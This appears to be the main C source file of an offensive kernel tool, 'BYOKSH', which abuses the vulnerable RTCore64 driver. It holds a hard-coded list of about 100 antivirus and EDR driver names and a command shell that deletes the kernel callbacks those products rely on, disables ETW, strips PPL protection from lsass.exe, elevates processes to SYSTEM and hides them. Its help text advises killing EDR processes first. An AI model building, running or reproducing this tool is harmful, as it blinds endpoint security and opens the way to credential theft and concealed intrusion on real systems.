
#include "utils.h"



EZPDB pdb;
ULONG_PTR ntoskrnlBase;

const char* monitoredDrivers[] = {
	"EX64.sys", "Eng64.sys", "teefer2.sys", "teefer3.sys", "srtsp64.sys",
	"srtspx64.sys", "srtspl64.sys", "Ironx64.sys", "fekern.sys", "cbk7.sys",
	"WdFilter.sys", "cbstream.sys", "atrsdfw.sys", "avgtpx86.sys",
	"avgtpx64.sys", "naswSP.sys", "ProcessSnitch.sys", "edrsensor.sys", "CarbonBlackK.sys",
	"parity.sys", "csacentr.sys", "csaenh.sys", "csareg.sys", "csascr.sys",
	"csaav.sys", "csaam.sys", "rvsavd.sys", "cfrmd.sys", "cmdccav.sys",
	"cmdguard.sys", "CmdMnEfs.sys", "MyDLPMF.sys", "im.sys", "csagent.sys",
	"CybKernelTracker.sys", "CRExecPrev.sys", "CyOptics.sys", "CyProtectDrv32.sys",
	"CyProtectDrv64.sys", "groundling32.sys", "groundling64.sys", "esensor.sys",
	"edevmon.sys", "ehdrv.sys", "FeKern.sys", "WFP_MRT.sys", "xfsgk.sys",
	"fsatp.sys", "fshs.sys", "HexisFSMonitor.sys", "klifks.sys", "klifaa.sys",
	"Klifsm.sys", "mbamwatchdog.sys", "mfeaskm.sys", "mfencfilter.sys",
	"PSINPROC.SYS", "PSINFILE.SYS", "amfsm.sys", "amm8660.sys", "amm6460.sys",
	"eaw.sys", "SAFE-Agent.sys", "SentinelMonitor.sys", "SAVOnAccess.sys",
	"savonaccess.sys", "sld.sys", "pgpwdefs.sys", "GEProtection.sys",
	"diflt.sys", "sysMon.sys", "ssrfsf.sys", "emxdrv2.sys", "reghook.sys",
	"spbbcdrv.sys", "bhdrvx86.sys", "bhdrvx64.sys", "symevent.sys", "vxfsrep.sys",
	"VirtFile.sys", "SymAFR.sys", "symefasi.sys", "symefa.sys", "symefa64.sys",
	"SymHsm.sys", "evmf.sys", "GEFCMP.sys", "VFSEnc.sys", "pgpfs.sys",
	"fencry.sys", "symrg.sys", "ndgdmk.sys", "ssfmonm.sys", "SISIPSFileFilter.sys",
	"cyverak.sys", "cyvrfsfd.sys", "cyvrmtgn.sys", "tdevflt.sys", "tedrdrv.sys",
	"tedrpers.sys", "telam.sys", "cyvrlpc.sys", "MpKslf8d86dba.sys", "mssecflt.sys"
};


int main() {

	HANDLE hDevice = CreateFile(
		L"\\\\.\\RTCore64",
		GENERIC_READ | GENERIC_WRITE,
		0,
		NULL,
		OPEN_EXISTING,
		0,
		NULL
	);

	ntoskrnlBase = GetKernelBaseAddress();
	
	printf("Kernel base: %p\n", ntoskrnlBase);

	printf("Downloading pdb files\n");

    pdb = loadKernelOffsets();



	CHAR input[256];

	printf("WELCOME TO BYOKSH Bring Your Own Snitch Hunter. type help to see options\n\n");

	while (1) {
		printf("> ");
		fgets(input, 256, stdin);
		//if (strncmp(input, "elproccallback", 14) == 0) {
		//	DeleteProcCallback(hDevice);
		//}
		if (strncmp(input, "listproccallback", 16) == 0) {
			ListProcCallback(hDevice);
		}
		else if (strncmp(input, "listthreadcallback", 18) == 0) {
			ListThreadCallback(hDevice);
		}
		else if (strncmp(input, "listloadimagecallback", 21) == 0) {
			ListLoadImageCallback(hDevice);
		}
		else if (strncmp(input, "listregcallback", 15) == 0) {
			ListRegCallback(hDevice);
		}
		else if (strncmp(input, "listobjcallback", 15) == 0) {
			ListObjCallback(hDevice);
		}

		else if (strncmp(input, "elproccallback", 14) == 0) {
			DeleteProcCallback(hDevice);
		}
		else if (strncmp(input, "elthreadcallback", 16) == 0) {
			DeleteThreadCallback(hDevice);
		}
		else if (strncmp(input, "elloadimagecallback", 19) == 0) {
			DeleteLoadImageCallback(hDevice);
		}
		else if (strncmp(input, "elregcallback", 13) == 0) {
			DeleteRegCallback(hDevice);
		}
		else if (strncmp(input, "elobjcallback", 13) == 0) {
			DeleteObjCallback(hDevice);
		}


		else if (strncmp(input, "bypassppl", 9) == 0) {
			DWORD pid = atoi(input + 10);
			if (pid == 0) {
				printf("Invalid PID.\n");
				continue;
			}
			BypassPpl(hDevice, pid);
		}
		else if (strncmp(input, "bypassppllsass", 14) == 0) {
			DWORD64 pid = FindProcessId("lsass.exe");
			BypassPpl(hDevice, pid);
		}

		else if (strncmp(input, "elevateproc", 11) == 0) {
			DWORD pid = atoi(input + 12);
			if (pid == 0) {
				printf("Invalid PID.\n");
				continue;
			}
			elevateProc(hDevice, pid);
		}
		else if (strncmp(input, "hideproc", 8) == 0) {
			DWORD pid = atoi(input + 9);
			if (pid == 0) {
				printf("Invalid PID.\n");
				continue;
			}
			hideProc(hDevice, pid);
		}

		else if (strncmp(input, "disablewti", 10) == 0) {
			disableWTI(hDevice);
		}
		else if (strncmp(input, "exit", 4) == 0) {
			exit(0);
		}
		else if (strncmp(input, "help", 4) == 0) {
			printf("Help menu:\n");

			printf(" - listproccallback			- List process notify routines\n");
			printf(" - listthreadcallback		- List thread notify routines\n");
			printf(" - listloadimagecallback    - List load image notify routines\n");
			printf(" - listregcallback          - List registry notify routines \n");
			printf(" - listobjcallback          - List objects notify routines\n\n");
			//printf(" - listmf               - List Minifilter drivers (only KMDebug)\n\n");

			printf(" - elproccallback			- Eliminate process notify routine callback\n");
			printf(" - elthreadcallback			- Eliminate thread notify routine callback\n");
			printf(" - elloadimagecallback		- Eliminate load image notify routine callback\n");
			printf(" - elregcallback			- Eliminate registry notify routine callback\n");
			printf(" - elobjcallback			- Eliminate object notify routine callback\n\n");
			//printf(" - elmfcallback         - Eliminate MiniFilter notify callbacks\n");


			printf(" - disablewti				- disable ETW kernel provider\n");

			printf(" - bypassppl <PID>			- Bypass PPL for a specific process by PID\n");
			printf(" - bypassppllsass			- Bypass PPL for lsass.exe (Suggestion: Terminate EDR processes before)\n\n");

			printf(" - elevateproc <PID>		- Elevate a specific process by PID using local system\n");
			//printf(" - downGrade <PID>      - Downgrade a specific process by PID to non-PPL\n\n");

			printf(" - hideproc <PID>			- Hide a specific process by PID\n");

			printf(" - help						- Show this help menu\n");
			printf(" - exit						- Exit the program\n");
		}
	}

}